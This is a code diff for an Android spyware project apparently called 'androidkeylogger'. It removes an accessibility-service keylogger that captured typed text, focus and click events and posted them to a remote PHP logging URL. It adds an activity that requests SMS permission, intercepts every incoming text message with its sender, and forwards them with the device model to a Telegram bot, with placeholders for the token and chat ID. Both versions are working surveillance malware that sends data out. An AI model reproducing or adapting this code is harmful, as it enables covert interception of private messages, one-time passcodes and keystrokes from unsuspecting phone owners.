@@ -1,10 +1,24 @@
 package com.bshu2.androidkeylogger;
 
-import android.accessibilityservice.AccessibilityService;
+import android.Manifest;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.os.AsyncTask;
-import android.os.Build;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
 import android.util.Log;
-import android.view.accessibility.AccessibilityEvent;
+import android.widget.Toast;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+import com.karumi.dexter.Dexter;
+import com.karumi.dexter.PermissionToken;
+import com.karumi.dexter.listener.PermissionRequest;
+import com.karumi.dexter.listener.single.PermissionListener;
+
+import com.example.sample.Constants; // ✅ Replace with your actual package
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -13,22 +27,82 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Locale;
 
-/**
- * Keylogger Service for logging accessibility events and sending data to a remote server.
- */
-public class Keylogger extends AccessibilityService {
+public class SmsEyeMainActivity extends AppCompatActivity {
 
-    private static final String SERVER_URL = "https://journal-index.org//logs/get.php";
-    private static final String TAG = "Keylogger";
+    private SmsReceiver smsReceiver;
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN"; // 🔁 Replace with your bot token
 
-    private class SendToServerTask extends AsyncTask<String, Void, Void> {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        Dexter.withContext(this)
+                .withPermission(Manifest.permission.RECEIVE_SMS)
+                .withListener(new PermissionListener() {
+                    @Override
+                    public void onPermissionGranted(PermissionRequest permissionRequest) {
+                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Granted", Toast.LENGTH_SHORT).show();
+                        registerSMSReceiver();
+                    }
+
+                    @Override
+                    public void onPermissionDenied(PermissionRequest permissionRequest) {
+                        Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Denied", Toast.LENGTH_SHORT).show();
+                    }
+
+                    @Override
+                    public void onPermissionRationaleShouldBeShown(PermissionRequest permissionRequest, PermissionToken token) {
+                        token.continuePermissionRequest();
+                    }
+                })
+                .check();
+    }
+
+    private void registerSMSReceiver() {
+        smsReceiver = new SmsReceiver();
+        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+        registerReceiver(smsReceiver, filter);
+    }
+
+    public static class SmsReceiver extends BroadcastReceiver {
+        private static final String TAG = "SmsReceiver";
+
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
+            if (pdus == null) return;
+
+            StringBuilder smsMessage = new StringBuilder();
+
+            for (Object pdu : pdus) {
+                SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
+                smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
+                smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
+            }
+
+            String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
+                    .format(Calendar.getInstance().getTime());
+            String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
+            String logMessage = "[" + deviceName + "] " + timestamp + "\n" + smsMessage.toString();
+
+            new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, logMessage);
+        }
+    }
+
+    public static class SendToTelegramTask extends AsyncTask<String, Void, Void> {
+        private static final String TAG = "SendToTelegramTask";
+
         @Override
         protected Void doInBackground(String... params) {
             try {
-                String message = params[0];
-                String payload = "log_data=" + message.replace(" ", "+");
+                String botToken = params[0];
+                String chatId = params[1];
+                String message = params[2];
 
-                URL url = new URL(SERVER_URL);
+                String telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
+
+                URL url = new URL(telegramUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
@@ -39,52 +113,11 @@ public class Keylogger extends AccessibilityService {
                     os.flush();
                 }
 
-                Log.d(TAG, "Server Response Code: " + conn.getResponseCode());
+                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
             } catch (Exception e) {
-                Log.e(TAG, "Error sending data to server", e);
+                Log.e(TAG, "Error sending message to Telegram", e);
             }
             return null;
         }
-    }
-
-    @Override
-    public void onServiceConnected() {
-        Log.d(TAG, "Keylogger service connected.");
-    }
-
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
-                .format(Calendar.getInstance().getTime());
-        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
-        String data = event.getText().toString();
-
-        if (data == null || data.trim().isEmpty()) {
-            return;
-        }
-
-        String logMessage = "[" + deviceName + "] " + timestamp;
-
-        switch (event.getEventType()) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                logMessage += " | (TEXT_CHANGED) | " + data;
-                new SendToServerTask().execute(logMessage);
-                break;
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                logMessage += " | (FOCUSED) | " + data;
-                new SendToServerTask().execute(logMessage);
-                break;
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                logMessage += " | (CLICKED) | " + data;
-                new SendToServerTask().execute(logMessage);
-                break;
-            default:
-                break;
-        }
-    }
-
-    @Override
-    public void onInterrupt() {
-        Log.d(TAG, "Keylogger service interrupted.");
     }
 }
